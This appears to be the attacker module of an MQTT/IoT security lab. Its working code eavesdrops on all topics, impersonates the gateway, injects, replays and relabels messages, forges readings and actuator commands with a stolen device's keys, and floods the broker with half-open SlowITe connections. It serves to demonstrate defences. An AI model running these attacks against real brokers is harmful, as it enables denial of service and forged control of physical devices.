"""The attacker ("mallory"): a client with broker access but no secrets, unless
the lab hands it a compromised device's material (`stolen_key`).

By default it knows the broker address and the public CA certificate, nothing
else: no password, no client certificate, no payload key. While enabled it

  - stays connected and subscribed to '#', counting what it receives (leak)
    and how much of it is readable (a plaintext send time at offset 0),
  - optionally impersonates the gateway (username "gateway", no password),
  - injects forged plaintext into a sensor's topic at `inject_rate` msg/s
    (payload: send time + "FORGED!!", which the gateway counts if accepted),
  - re-publishes captured messages at `replay_rate` msg/s (same topic),
  - re-publishes captured messages on another topic of the same device at
    `republish_rate` msg/s (".../temp" → ".../humidity"): the topic is in the
    envelope's associated data,
  - relabels the protection mode of captured envelopes at `relabel_rate` msg/s
    (encrypt ↔ auth_only, nothing else changed): the mode is in the AAD.

With `stolen_key` = n it is a compromised sensor-n: it holds that device's
payload keys, its broker password and (mtls) certificate — what an attacker
gets by taking over the device — and connects as sensor-n. The lab keeps the
real sensor-n offline meanwhile (attacker.stolen_exclusive); with that off,
both use the same client id and take the session from each other about once
a second. Then it also

  - seals forged readings with sensor-n's key at `stolen_rate` msg/s, on
    sensor-n's own topic or another device's (`stolen_target` own|other), in
    `stolen_mode` (default: the lab's protection), dated `stolen_age_s` in the
    past (an old message never seen before: new sequence numbers, old time),
  - forges commands to another actuator at `forge_commands_rate` msg/s with the
    gateway's key material every actuator holds (the AES group key, or only the
    gateway's public key in sign mode, which cannot produce a signature).

Availability attacks:

  - `slow_connections` = N: holds N TCP connections open with a partial
    CONNECT (SlowITe), reopening any the broker closes, and reports how many
    it holds,
  - `probe_rate`: attempts a fresh anonymous connection that often and reports
    how many succeed and how long they take (are legitimate newcomers admitted?).

Each security switch shows up in its reports: auth or mtls keep it off the
broker, the ACL starves '#' and blocks injections, payload protection makes
what it sees unreadable and its forgeries/replays bounce off the gateway.
"""

from __future__ import annotations

import collections
import multiprocessing as mp
import os
import queue
import random
import socket
import ssl
import tempfile
import threading
import time

from msec_envelope import (AUTH_ONLY, ENCRYPT, GATEWAY_OWNER, MODES, NONE,
                           SENDER_PROTECTION_MODES, KeySet, Protector, add_line)
from sensors import make_client

REPORT_INTERVAL = 0.5
FORGED_MARKER = b"FORGED!!"
FORGED_COMMAND = b"FORGED-C"
STOLEN_BURST = 16   # stolen-key messages per pass of the main loop, at most
# A payload is "readable" if it starts with a plausible send time (ns).
READABLE_WINDOW_NS = 300 * 1_000_000_000
RELABEL = {MODES[ENCRYPT]: MODES[AUTH_ONLY], MODES[AUTH_ONLY]: MODES[ENCRYPT]}
COUNTERS = ("received", "readable", "injected", "replayed", "republished", "relabelled",
            "stolen_sent", "commands_forged", "probe_ok", "probe_failed")


def readable(payload: bytes, now_ns: int) -> bool:
    if len(payload) < 8:
        return False
    return abs(int.from_bytes(payload[:8], "big") - now_ns) < READABLE_WINDOW_NS


def other_sensor(n: int) -> int:
    return 2 if n == 1 else 1


class _Material:
    """A compromised device's secrets, as handed over by the lab."""

    def __init__(self, sensor: int, material: dict) -> None:
        self.sensor = sensor
        self.name = f"sensor-{sensor}"
        self.keys = KeySet()
        for line in material.get("keys", []):
            add_line(self.keys, line)
        self.password = material.get("password")
        self.cert = None
        if material.get("cert") and material.get("key"):
            d = tempfile.mkdtemp(prefix="mallory-")
            cert, key = os.path.join(d, "c.crt"), os.path.join(d, "c.key")
            with open(cert, "w", encoding="ascii") as f:
                f.write(material["cert"])
            fd = os.open(key, os.O_WRONLY | os.O_CREAT, 0o600)
            with os.fdopen(fd, "w", encoding="ascii") as f:
                f.write(material["key"])
            self.cert = (cert, key)

    def own_key(self) -> int | None:
        ids = [k for k, o in self.keys.owners.items() if o == self.name and k in self.keys.aead]
        return max(ids) if ids else None

    def gateway_key(self) -> int | None:
        ids = [k for k, o in self.keys.owners.items() if o == GATEWAY_OWNER]
        return max(ids) if ids else None

    def protector(self, mode: str, age_s: float) -> Protector | None:
        kid = self.own_key()
        if kid is None or mode == NONE:
            return None
        return Protector(mode, kid, self.keys.aead.get(kid), self.keys.sign_private.get(kid),
                         algorithm=self.keys.algorithm(kid),
                         clock_ns=lambda: time.time_ns() - int(age_s * 1e9))

    def command_forger(self, mode: str) -> Protector | None:
        """Seals commands under the gateway's key id with whatever this device
        has: the shared AES key works; for signatures it only has its OWN
        private key, so the result cannot verify as the gateway's."""
        gw = self.gateway_key()
        own = self.own_key()
        if gw is None or mode == NONE:
            return None
        return Protector(mode, gw, self.keys.aead.get(gw),
                         self.keys.sign_private.get(own) if own is not None else None,
                         algorithm=self.keys.algorithm(gw))


class _SlowConnections:
    """SlowITe: occupy broker connections with a CONNECT that never completes."""

    def __init__(self) -> None:
        self.socks: list[socket.socket] = []
        self.last_fill = 0.0

    def maintain(self, target: int, host: str, port: int, mode: str) -> None:
        alive = []
        for s in self.socks:
            try:
                if s.recv(1, socket.MSG_PEEK | socket.MSG_DONTWAIT) == b"":
                    s.close()          # the broker closed it
                    continue
            except BlockingIOError:
                pass                   # still open, nothing to read: held
            except OSError:
                s.close()
                continue
            alive.append(s)
        self.socks = alive[:target]
        for s in alive[target:]:
            s.close()
        now = time.monotonic()
        if len(self.socks) < target and now - self.last_fill > 1.0:
            self.last_fill = now
            for _ in range(min(target - len(self.socks), 200)):
                try:
                    s = socket.create_connection((host, port), timeout=1)
                except OSError:
                    break
                if mode == "plain":
                    s.sendall(b"\x10")  # CONNECT packet type, then nothing
                s.setblocking(False)
                self.socks.append(s)

    @property
    def held(self) -> int:
        return len(self.socks)

    def close(self) -> None:
        for s in self.socks:
            s.close()
        self.socks = []


def _probe(transport: dict, timeout: float = 3.0) -> float | None:
    """One fresh anonymous connection; seconds to CONNACK, or None if refused."""
    done = threading.Event()
    ok = {"v": False}

    def on_connect(_c, _u, _f, reason_code, _p):
        ok["v"] = not reason_code.is_failure
        done.set()

    try:
        client = make_client(f"probe-{random.randrange(1 << 30)}", transport)
    except (OSError, ssl.SSLError, ValueError):
        return None
    client.on_connect = on_connect
    t0 = time.monotonic()
    try:
        client.connect(transport["host"], transport["port"], keepalive=10)
        client.loop_start()
        done.wait(timeout)
    except (OSError, ssl.SSLError):
        return None
    finally:
        try:
            client.disconnect()
            client.loop_stop()
        except Exception:  # noqa: BLE001 - best effort cleanup
            pass
    return time.monotonic() - t0 if ok["v"] else None


def _run(settings: dict, control: mp.Queue, reports: mp.Queue, stop: mp.Event) -> None:
    state = dict(settings)
    lock = threading.Lock()
    captured: collections.deque = collections.deque(maxlen=500)
    counters = dict.fromkeys(COUNTERS, 0)
    probe_ms: collections.deque = collections.deque(maxlen=50)
    status = {"connected": False, "detail": "idle"}
    client = None
    material: _Material | None = None
    slow = _SlowConnections()

    def on_connect(c, _userdata, _flags, reason_code, _props):
        if reason_code.is_failure:
            status.update(connected=False, detail=f"refused by broker: {reason_code}")
            return
        status.update(connected=True, detail=f"connected as {identity()}")
        c.subscribe("#", qos=0)

    def on_disconnect(_c, _userdata, _flags, _reason_code, _props):
        # MQTT 3.1.1 carries no reason on disconnect; say what we know instead.
        if status["connected"]:
            status.update(connected=False, detail="kicked out by broker")
        elif not status["detail"].startswith("refused"):
            mode = state["transport"]["mode"]
            status.update(detail="cannot connect: " + (
                "no client certificate" if mode == "mtls" else "connection rejected"))

    def on_connect_fail(_c, _userdata):
        status.update(connected=False, detail="cannot connect: TLS handshake or network")

    def identity() -> str:
        if material is not None:
            return material.name
        return "gateway" if state["impersonate"] else "mallory"

    def on_message(_c, _userdata, message):
        now = time.time_ns()
        with lock:
            counters["received"] += 1
            payload = bytes(message.payload)
            if readable(payload, now):
                counters["readable"] += 1
            if "/sensors/" in message.topic:
                captured.append((message.topic, payload))

    def disconnect() -> None:
        nonlocal client
        if client is not None:
            client.disconnect()
            client.loop_stop()
            client = None
        status.update(connected=False, detail="idle")

    def connect() -> None:
        nonlocal client, material
        disconnect()
        material = (_Material(state["stolen_key"], state.get("material") or {})
                    if state.get("stolen_key") else None)
        if not state["enabled"]:
            return
        transport = state["transport"]
        try:
            if material is not None:
                # A compromised device: its own name, password and certificate.
                # The device's own client id, as the device itself would use: the
                # broker takes the real device's session over (MQTT §3.1.4).
                client = make_client(material.name, transport, material.name,
                                     material.password, material.cert)
            else:
                # No password, no client certificate: it has neither.
                client = make_client(f"mallory-{random.randrange(1 << 30)}", transport,
                                     identity())
        except (OSError, ssl.SSLError, ValueError) as e:
            status.update(detail=f"setup failed: {e}")
            return
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
        client.on_connect_fail = on_connect_fail
        client.on_message = on_message
        client.reconnect_delay_set(min_delay=1, max_delay=2)
        client.connect_async(transport["host"], transport["port"], keepalive=30)
        client.loop_start()
        status.update(detail=f"connecting as {identity()}")

    def prober() -> None:
        while not stop.is_set():
            rate = state.get("probe_rate", 0.0)
            if rate <= 0 or not state["enabled"]:
                stop.wait(0.5)
                continue
            seconds = _probe(state["transport"])
            with lock:
                if seconds is None:
                    counters["probe_failed"] += 1
                else:
                    counters["probe_ok"] += 1
                    probe_ms.append(1000 * seconds)
            stop.wait(max(1.0 / rate, 0.05))

    threading.Thread(target=prober, daemon=True).start()
    connect()
    next_at: dict[str, float] = collections.defaultdict(time.monotonic)
    last_report = time.monotonic()

    def due(name: str, rate: float, now: float) -> bool:
        if rate <= 0 or now < next_at[name]:
            return False
        next_at[name] = max(next_at[name] + 1 / rate, now - 1)
        return True

    protectors: dict = {}

    def stolen_protector(mode: str, age_s: float):
        """One Protector (one sequence counter) per compromised device, mode and age."""
        key = (id(material), material.own_key(), mode, age_s)
        if key not in protectors:
            protectors.clear()
            protectors[key] = material.protector(mode, age_s)
        return protectors[key]

    def sample(pred=None):
        with lock:
            pool = [c for c in captured if pred is None or pred(c)]
        return random.choice(pool) if pool else None

    while not stop.is_set():
        try:
            while True:
                change = control.get_nowait()
                reconnect = any(k in change for k in ("enabled", "impersonate", "transport",
                                                      "stolen_key", "material"))
                state.update(change)
                if reconnect:
                    connect()
        except queue.Empty:
            pass

        now = time.monotonic()
        t = state["transport"]
        if state["enabled"] and state.get("slow_connections", 0) > 0:
            slow.maintain(state["slow_connections"], t["host"], t["port"], t["mode"])
        elif slow.held:
            slow.close()

        if client is not None and status["connected"]:
            zone = state["zone"]
            protection = SENDER_PROTECTION_MODES.get(state.get("protection", "none"), NONE)
            if due("inject", state["inject_rate"], now):
                topic = f"{zone}/sensors/sensor-1/temp"
                payload = time.time_ns().to_bytes(8, "big") + FORGED_MARKER + bytes(8)
                client.publish(topic, payload, qos=0)
                counters["injected"] += 1
            if due("replay", state["replay_rate"], now):
                s = sample()
                if s:
                    client.publish(s[0], s[1], qos=0)
                    counters["replayed"] += 1
            if due("republish", state.get("republish_rate", 0.0), now):
                s = sample(lambda c: c[0].endswith("/temp"))
                if s:
                    client.publish(s[0][: -len("temp")] + "humidity", s[1], qos=0)
                    counters["republished"] += 1
            if due("relabel", state.get("relabel_rate", 0.0), now):
                s = sample(lambda c: c[1][:2] == b"MS" and len(c[1]) > 3 and c[1][3] in RELABEL)
                if s:
                    data = bytearray(s[1])
                    data[3] = RELABEL[data[3]]
                    client.publish(s[0], bytes(data), qos=0)
                    counters["relabelled"] += 1
            if material is not None:
                # Several per pass: the loop sleeps 5 ms, and a flood is faster than that.
                for _ in range(STOLEN_BURST):
                    if not due("stolen", state.get("stolen_rate", 0.0), now):
                        break
                    # Without an envelope at the receiver there is nothing to downgrade
                    # or to authenticate: plaintext is what it accepts.
                    mode = (NONE if protection == NONE else
                            SENDER_PROTECTION_MODES.get(state.get("stolen_mode") or "", protection))
                    p = stolen_protector(mode, state.get("stolen_age_s", 0.0))
                    target = (material.sensor if state.get("stolen_target", "own") == "own"
                              else other_sensor(material.sensor))
                    topic = f"{zone}/sensors/sensor-{target}/temp"
                    plain = time.time_ns().to_bytes(8, "big") + FORGED_MARKER + bytes(8)
                    client.publish(topic, p.protect(topic.encode(), plain) if p else plain, qos=0)
                    counters["stolen_sent"] += 1
                if due("forge_cmd", state.get("forge_commands_rate", 0.0), now):
                    f = material.command_forger(protection)
                    target = f"sensor-{other_sensor(material.sensor)}"
                    topic = f"{zone}/actuators/{target}/cmd"
                    plain = (time.time_ns().to_bytes(8, "big") + FORGED_COMMAND
                             + f"CMD:{target}".encode())
                    try:
                        data = f.protect(topic.encode(), plain) if f else plain
                    except (ValueError, AttributeError):
                        data = plain
                    client.publish(topic, data, qos=0)
                    counters["commands_forged"] += 1
        if now - last_report > REPORT_INTERVAL:
            last_report = now
            with lock:
                reports.put({**counters, **status, "identity": identity(),
                             "enabled": state["enabled"], "captured": len(captured),
                             "slow_held": slow.held,
                             "probe_ms": (sorted(probe_ms)[len(probe_ms) // 2]
                                          if probe_ms else 0.0)})
        time.sleep(0.005)
    slow.close()
    disconnect()


class Attacker:
    def __init__(self, **settings) -> None:
        ctx = mp.get_context("spawn")
        self.control = ctx.Queue()
        self.reports = ctx.Queue()
        self.stop_event = ctx.Event()
        self.latest = {**dict.fromkeys(COUNTERS, 0), "connected": False, "detail": "starting",
                       "identity": "mallory", "enabled": settings["enabled"], "captured": 0,
                       "slow_held": 0, "probe_ms": 0.0}
        self.proc = ctx.Process(target=_run, args=(settings, self.control, self.reports,
                                                   self.stop_event), daemon=True)
        self.proc.start()

    def update(self, **change) -> None:
        self.control.put(change)

    def poll(self) -> dict:
        while True:
            try:
                self.latest = self.reports.get_nowait()
            except queue.Empty:
                return self.latest

    def stop(self) -> None:
        self.stop_event.set()
        self.proc.join(timeout=5)
        if self.proc.is_alive():
            self.proc.kill()
